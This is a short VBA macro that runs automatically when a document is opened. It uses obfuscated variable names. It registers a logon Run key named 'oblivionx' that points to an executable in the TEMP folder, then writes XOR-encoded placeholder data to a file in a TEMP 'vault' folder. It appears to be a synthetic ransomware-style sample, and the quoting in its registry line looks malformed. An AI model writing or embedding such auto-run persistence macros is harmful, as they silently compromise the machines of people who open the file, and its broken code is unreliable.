Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim jybosg1pnivrj As Object
    Dim lps4wdhm As String, data As String, enc As String
    Dim sbospdtkrqzns As Long
    Set jybosg1pnivrj = CreateObject("WScript.Shell")
    jybosg1pnivrj.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\oblivionx", """ & Environ("TEMP") & "\oblivionx_lock.exe"", "REG_SZ"
    lps4wdhm = Environ("TEMP") & "\oblivionx_vault\secret.txt"
    data = "top secret marker data"
    enc = ""
    For sbospdtkrqzns = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, sbospdtkrqzns, 1)) Xor 42)
    Next sbospdtkrqzns
    Open lps4wdhm For Output As #1
    Print #1, enc
    Close #1
End Sub
